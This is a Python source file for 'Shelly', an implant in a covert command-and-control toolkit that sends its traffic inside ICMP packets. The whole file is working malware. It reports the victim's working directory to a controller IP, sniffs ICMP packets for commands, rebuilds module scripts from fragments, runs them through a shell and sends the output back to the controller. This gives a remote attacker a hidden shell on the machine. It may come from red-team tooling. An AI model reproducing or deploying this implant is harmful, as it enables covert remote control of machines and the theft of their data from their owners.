#!/usr/bin/python3

"""
Shelly implant
Vaughn Woerpel (vaughnw128/apicius)
"""

from scapy.all import sniff
from lib.shlib import Host
from subprocess import STDOUT, check_output, TimeoutExpired
import os
import struct
import socket
import sys

ICMP_ID = int(12800)
TTL = int(64)

# Set IP of the C2 here
if sys.argv[1] is None:
    print("Please supply an IP of the C2")
    sys.exit()

# Gets the controller ip from sys argv
addr_long = int(sys.argv[1], 16)
c_ip = socket.inet_ntoa(struct.pack("<L", addr_long))
c_ip = c_ip.split(".")
controller_ip = f"{c_ip[3]}.{c_ip[2]}.{c_ip[1]}.{c_ip[0]}"

class Implant(Host):
    """
    Implant class
     
    Extends from Host and incorporates special sniff callback responses specific
    to the needs of an implant
    """


    def __init__(self, controller_ip):
        super().__init__()
        self.controller_ip = controller_ip

        # Module cache exists to serve as the buffer for modules passed in from the run_module callback
        # This allows for truncated messages from the C2 server to be built into full scripts
        # Triple quoted to allow for things like newlines
        self.module_cache = """"""
        
    """
    Sniff callback responses
    """

    def join(self, shellpack: dict) -> None:
        """
        Responds to join commands

        Passes the working directory along with the join command
        """

        self.send(shellpack['ip'], "join", os.getcwd().encode(), icmp_type=8)

    def heartbeat_response(self, shellpack: dict) -> None:
        """
        Responds to heartbeat commands

        Checks to see if the ID matches what is in the shellpack and responds to the heartbeat
        """

        if shellpack['data'] == self.id:
            self.send(self.controller_ip, "heartbeat", self.id, icmp_type=0)

    def run_module(self, shellpack: dict) -> None:
        """
        Responds to run commands

        Checks shellpacks for truncated, completed, or none, and passes those on to the exec helper
        """

        if shellpack['target_id'] != self.id:
            return

        decoded_data = shellpack['data'].decode()

        match shellpack['option']:
            case "TRUNCATED":
                self.module_cache += decoded_data
            case "COMPLETE":
                self.module_cache += decoded_data
                self.exec_command(self.module_cache)
                self.module_cache = """"""
            case _:
                return
            
    def instruction(self, shellpack):
        """
        Responds to the instruction command
        """

        if shellpack['target_id'] != self.id:
            return

        self.exec_command(shellpack['data'].decode())

    """
    Helper functions
    """

    def exec_command(self, cmd: str) -> None:
        """
        Helper function for executing commands

        Uses subprocess check output with shell to allow for commands with piping and timeout
        
        Responds to errors by sending messages back to the shelly controller
        """

        try:
            output = check_output(cmd, stderr=STDOUT, timeout=3, shell=True)
            self.send(self.controller_ip, "instruction", output, icmp_type=8)
        except TimeoutExpired:
            self.send(self.controller_ip, "instruction", b'The command has timed out', option="ERROR", icmp_type=8)
        except Exception:
            self.send(self.controller_ip, "instruction", b'There was an error with the command', option="ERROR", icmp_type=8)

def main():
    # Defines the implant with the controller IP
    implant = Implant(controller_ip=controller_ip)

    # Send join command to the daemon
    implant.send(implant.controller_ip, "join", os.getcwd().encode())

    # Start sniffing
    sniff(iface=implant.iface, prn=implant.sniff_callback, filter="icmp", store="0")

if __name__ == "__main__":
    main()
